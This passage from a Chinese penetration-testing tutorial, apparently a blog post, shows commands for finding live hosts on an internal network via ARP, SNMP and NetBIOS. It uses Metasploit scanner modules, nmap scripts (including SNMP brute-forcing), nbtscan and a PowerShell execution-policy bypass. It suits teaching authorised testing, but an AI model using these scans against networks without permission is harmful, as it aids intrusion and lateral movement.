<p><img src="https://img-blog.csdnimg.cn/20201003082439282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>2、msf扫描</strong></p>
<pre><code class="prism language-c">msf <span class="token operator">&gt;</span> use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>arp_sweep
msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>arp_sweep<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options

Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>arp_sweep<span class="token punctuation">)</span><span class="token punctuation">:</span>

Name Current Setting Required Description
<span class="token operator">--</span><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
INTERFACE no The name of the interface
RHOSTS yes The target address range or CIDR identifier
SHOST no Source IP Address
SMAC no Source MAC Address
THREADS <span class="token number">1</span> yes The number of concurrent threads
TIMEOUT <span class="token number">5</span> yes The number of seconds to wait <span class="token keyword">for</span> new data

msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>arp_sweep<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span>
RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span>
msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>arp_sweep<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set THREADS <span class="token number">10</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003082457616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201003082503847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>3、netdiscover</strong></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># netdiscover <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> <span class="token operator">-</span>i wlan0
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003082522954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/2020100308252831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
4、arp-scan（linux）<br>
(推荐)速度与快捷 项目地址：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>linux<span class="token punctuation">.</span>die<span class="token punctuation">.</span>net<span class="token operator">/</span>man<span class="token operator">/</span><span class="token number">1</span><span class="token operator">/</span>arp<span class="token operator">-</span>scan
</code></pre>
<p>arp-scan没有内置kali，需要下载安装<br>
<img src="https://img-blog.csdnimg.cn/20201003082601877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201003082606893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>5、Powershell</strong></p>
<pre><code class="prism language-c">c<span class="token punctuation">:</span>\tmp<span class="token operator">&gt;</span>powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>exec bypass <span class="token operator">-</span>Command <span class="token string">"Import-Module .\arpscan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24"</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003082701388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>6、arp scannet</strong><br>
项目地址：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>sourceforge<span class="token punctuation">.</span>net<span class="token operator">/</span>projects<span class="token operator">/</span>arpscannet<span class="token operator">/</span>files<span class="token operator">/</span>arpscannet<span class="token operator">/</span>arpscannet <span class="token number">0.4</span><span class="token operator">/</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003082716830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>7、arp-scan（windows）</strong></p>
<p>(推荐)速度与快捷</p>
<pre><code class="prism language-c">arp<span class="token operator">-</span>scan<span class="token punctuation">.</span>exe <span class="token operator">-</span>t <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span><span class="token operator">/</span><span class="token number">24</span>
</code></pre>
<p>项目地址：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>QbsuranAlang<span class="token operator">/</span>arp<span class="token operator">-</span>scan<span class="token operator">-</span>windows<span class="token operator">-</span><span class="token operator">/</span>tree<span class="token operator">/</span>master<span class="token operator">/</span>arp<span class="token operator">-</span>scan （非官方）
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020100308275268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>8、arp-ping.exe</strong></p>
<pre><code class="prism language-c">arp<span class="token operator">-</span>ping<span class="token punctuation">.</span>exe <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.100</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003082809772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>9、其他</strong></p>
<p>如cain的arp发现，一些开源py，pl脚本等，不一一介绍。</p>
<p>参考文章：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>micro8<span class="token punctuation">.</span>gitbook<span class="token punctuation">.</span>io<span class="token operator">/</span>micro8<span class="token operator">/</span>contents<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">20</span><span class="token operator">/</span><span class="token number">13</span><span class="token operator">-</span>ji<span class="token operator">-</span>yu<span class="token operator">-</span>arp<span class="token operator">-</span>fa<span class="token operator">-</span>xian<span class="token operator">-</span>nei<span class="token operator">-</span>wang<span class="token operator">-</span>cun<span class="token operator">-</span>huo<span class="token operator">-</span>zhu<span class="token operator">-</span>ji#<span class="token number">5</span><span class="token operator">-</span>powershell
</code></pre>
<hr>
<h2><a id="5411_snmp_3082"></a>5.4.11 基于snmp发现内网存活主机</h2>
<p><strong>SNMP简介：</strong></p>
<p>SNMP是一种简单网络管理协议，它属于TCP/IP五层协议中的应用层协议，用于网络管理的协议。SNMP主要用于网络设备的管理。SNMP协议主要由两大部分构成：SNMP管理站和SNMP代理。SNMP管理站是一个中心节点，负责收集维护各个SNMP元素的信息，并对这些信息进行处理，最后反馈给网络管理员；而SNMP代理是运行在各个被管理的网络节点之上，负责统计该节点的各项信息，并且负责与SNMP管理站交互，接收并执行管理站的命令，上传各种本地的网络信息。</p>
<p><strong>nmap扫描：</strong></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># nmap <span class="token operator">-</span>sU <span class="token operator">--</span>script snmp<span class="token operator">-</span>brute <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> <span class="token operator">-</span>T4
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003235045631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>msf扫描：</strong></p>
<pre><code class="prism language-c">msf <span class="token operator">&gt;</span> use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>snmp_enum
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003235108503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>项目地址：</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>mcafee<span class="token punctuation">.</span>com<span class="token operator">/</span>us<span class="token operator">/</span>downloads<span class="token operator">/</span>free<span class="token operator">-</span>tools<span class="token operator">/</span>snscan<span class="token punctuation">.</span>aspx
</code></pre>
<p>依然是一块macafee出品的攻击</p>
<p><img src="https://img-blog.csdnimg.cn/20201003235131768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>NetCrunch：</strong></p>
<p><strong>项目地址：</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>adremsoft<span class="token punctuation">.</span>com<span class="token operator">/</span>demo<span class="token operator">/</span>
</code></pre>
<p>内网安全审计工具，包含了DNS审计，ping扫描，端口，网络服务等<br>
<img src="https://img-blog.csdnimg.cn/20201003235200989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>snmp for pl扫描：</strong></p>
<p><strong>项目地址：</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>dheiland<span class="token operator">-</span>r7<span class="token operator">/</span>snmp
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003235225708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201003235232604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>其他扫描：<br>
snmpbulkwalk：</strong><br>
<img src="https://img-blog.csdnimg.cn/20201003235248105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
snmp-check：<br>
<img src="https://img-blog.csdnimg.cn/20201003235300750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
snmptest：<br>
<img src="https://img-blog.csdnimg.cn/20201003235310829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>附录：</strong></p>
<pre><code class="prism language-c">use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>aix_version use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>snmp_enum
use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>arris_dg950
use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>snmp_enum_hp_laserjet
use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>brocade_enumhash use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>snmp_enumshares 
use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>cambium_snmp_loot use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>snmp_enumusers
use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>cisco_config_tftp use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>snmp_login
use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>cisco_upload_file use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>snmp_set
use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>netopia_enum
use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>ubee_ddw3611 
use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>sbg6580_enum
use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>xerox_workcentre_enumusers
</code></pre>
<p><strong>其他内网安全审计工具（snmp）：</strong><br>
项目地址：https://www.solarwinds.com/topics/snmp-scanner<br>
项目地址：https://www.netscantools.com/nstpro_snmp.html</p>
<p><strong>snmp for pl ：</strong></p>
<p>Can’t locate NetAddr/IP<br>
<img src="https://img-blog.csdnimg.cn/20201003235415641.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop<span class="token operator">/</span>snmp# wget http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>cpan<span class="token punctuation">.</span>org<span class="token operator">/</span>modules<span class="token operator">/</span>by<span class="token operator">-</span>module<span class="token operator">/</span>NetAddr<span class="token operator">/</span>NetAddr<span class="token operator">-</span>IP<span class="token operator">-</span><span class="token number">4.078</span><span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003235429224.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop<span class="token operator">/</span>snmp# tar xvzf <span class="token punctuation">.</span><span class="token operator">/</span>NetAddr<span class="token operator">-</span>IP<span class="token operator">-</span><span class="token number">4.078</span><span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003235442763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop<span class="token operator">/</span>snmp# cd NetAddr<span class="token operator">-</span>IP<span class="token operator">-</span><span class="token number">4.078</span><span class="token operator">/</span>
root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop<span class="token operator">/</span>snmp<span class="token operator">/</span>NetAddr<span class="token operator">-</span>IP<span class="token operator">-</span><span class="token number">4.078</span># ls
About<span class="token operator">-</span>NetAddr<span class="token operator">-</span>IP<span class="token punctuation">.</span>txt Artistic Changes 
Copying docs IP<span class="token punctuation">.</span>pm Lite Makefile<span class="token punctuation">.</span>PL 
MANIFEST MANIFEST<span class="token punctuation">.</span>SKIP META<span class="token punctuation">.</span>yml t TODO
root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop<span class="token operator">/</span>snmp<span class="token operator">/</span>NetAddr<span class="token operator">-</span>IP<span class="token operator">-</span><span class="token number">4.078</span># perl Makefile<span class="token punctuation">.</span>PL
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003235456678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop<span class="token operator">/</span>snmp<span class="token operator">/</span>NetAddr<span class="token operator">-</span>IP<span class="token operator">-</span><span class="token number">4.078</span># make
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003235508966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop<span class="token operator">/</span>snmp<span class="token operator">/</span>NetAddr<span class="token operator">-</span>IP<span class="token operator">-</span><span class="token number">4.078</span># make install
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003235522300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201003235527804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
参考文章：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>micro8<span class="token punctuation">.</span>gitbook<span class="token punctuation">.</span>io<span class="token operator">/</span>micro8<span class="token operator">/</span>contents<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">20</span><span class="token operator">/</span><span class="token number">20</span><span class="token operator">-</span>ji<span class="token operator">-</span>yu<span class="token operator">-</span>snmp<span class="token operator">-</span>fa<span class="token operator">-</span>xian<span class="token operator">-</span>nei<span class="token operator">-</span>wang<span class="token operator">-</span>cun<span class="token operator">-</span>huo<span class="token operator">-</span>zhu<span class="token operator">-</span>ji
</code></pre>
<hr>
<h2><a id="5412_netbios_3194"></a>5.4.12 基于netbios发现內网存活主机</h2>
<p><strong>netbios简介：</strong></p>
<p>IBM公司开发，主要用于数十台计算机的小型局域网。该协议是一种在局域网上的程序可以使用的应用程序编程接口（API），为程序提供了请求低级服务的同一的命令集，作用是为了给局域网提供网络以及其他特殊功能。</p>
<p>系统可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名-——特指基于NETBIOS协议获得计算机名称——解析为相应IP地址，实现信息通讯，所以在局域网内部使用NetBIOS协议可以方便地实现消息通信及资源的共享</p>
<p><strong>nmap扫描：</strong></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># nmap <span class="token operator">-</span>sU <span class="token operator">--</span>script nbstat<span class="token punctuation">.</span>nse <span class="token operator">-</span>p137 <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> <span class="token operator">-</span>T4
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003235656679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<p><strong>msf扫描：</strong></p>
<pre><code class="prism language-c">msf <span class="token operator">&gt;</span> use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003235722258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<p><strong>nbtscan扫描：</strong></p>
<p>项目地址：</p>
<pre><code class="prism language-c">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>unixwiz<span class="token punctuation">.</span>net<span class="token operator">/</span>tools<span class="token operator">/</span>nbtscan<span class="token punctuation">.</span>html
</code></pre>
<p><strong>Windows:</strong></p>
<pre><code class="prism language-c">D<span class="token punctuation">:</span>\<span class="token operator">&gt;</span>nbtscan<span class="token operator">-</span><span class="token number">1.0</span><span class="token number">.35</span><span class="token punctuation">.</span>exe <span class="token operator">-</span>m <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003235744470.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">D<span class="token punctuation">:</span>\<span class="token operator">&gt;</span>nbtstat <span class="token operator">-</span>n （推荐）
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003235808852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201003235817317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>Linux：（推荐）</strong></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop<span class="token operator">/</span>nbtscan# tar <span class="token operator">-</span>zxvf <span class="token punctuation">.</span><span class="token operator">/</span>nbtscan<span class="token operator">-</span>source<span class="token operator">-</span><span class="token number">1.0</span><span class="token number">.35</span><span class="token punctuation">.</span>tgz（<span class="token number">1.5</span><span class="token number">.1</span>版本在附录）
root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop<span class="token operator">/</span>nbtscan# make 
root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop<span class="token operator">/</span>nbtscan# nbtscan <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003235838597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop<span class="token operator">/</span>nbtscan# nbtscan <span class="token operator">-</span>v <span class="token operator">-</span>s<span class="token punctuation">:</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020100323585318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<p><strong>NetBScanner：</strong></p>
<p>项目地址：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>nirsoft<span class="token punctuation">.</span>net<span class="token operator">/</span>utils<span class="token operator">/</span>netbios_scanner<span class="token punctuation">.</span>html
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201003235911879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>附录：<br>
<strong>nbtscan：</strong></p>
<pre><code class="prism language-c">NBTscan version <span class="token number">1.5</span><span class="token number">.1</span><span class="token punctuation">.</span> Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">1999</span><span class="token operator">-</span><span class="token number">2003</span> Alla Bezroutchko<span class="token punctuation">.</span> This is a free software and it comes with absolutely no warranty<span class="token punctuation">.</span> You can use<span class="token punctuation">,</span>distribute and modify it under terms of GNU GPL<span class="token punctuation">.</span>

Usage<span class="token punctuation">:</span>
nbtscan <span class="token punctuation">[</span><span class="token operator">-</span>v<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>d<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>e<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>l<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>t timeout<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>b bandwidth<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>r<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>q<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>s separator<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>m retransmits<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token operator">-</span>f filename<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token operator">&lt;</span>scan_range<span class="token operator">&gt;</span><span class="token punctuation">)</span>
    <span class="token operator">-</span>v verbose output<span class="token punctuation">.</span> Print all names receivedfrom each host
    <span class="token operator">-</span>d dump packets<span class="token punctuation">.</span> Print whole packet contents<span class="token punctuation">.</span>
    <span class="token operator">-</span>e Format output in <span class="token operator">/</span>etc<span class="token operator">/</span>hosts format<span class="token punctuation">.</span>
    <span class="token operator">-</span>l Format output in lmhosts format<span class="token punctuation">.</span>Cannot be used with <span class="token operator">-</span>v<span class="token punctuation">,</span> <span class="token operator">-</span>s or <span class="token operator">-</span>h options<span class="token punctuation">.</span>
    <span class="token operator">-</span>t timeout wait timeout milliseconds <span class="token keyword">for</span> response<span class="token punctuation">.</span>Default <span class="token number">1000.</span>
    <span class="token operator">-</span>b bandwidth Output throttling<span class="token punctuation">.</span> Slow down output so that it uses no more that bandwidth bps<span class="token punctuation">.</span> Useful on slow links<span class="token punctuation">,</span> so that ougoing queries don't get dropped<span class="token punctuation">.</span>
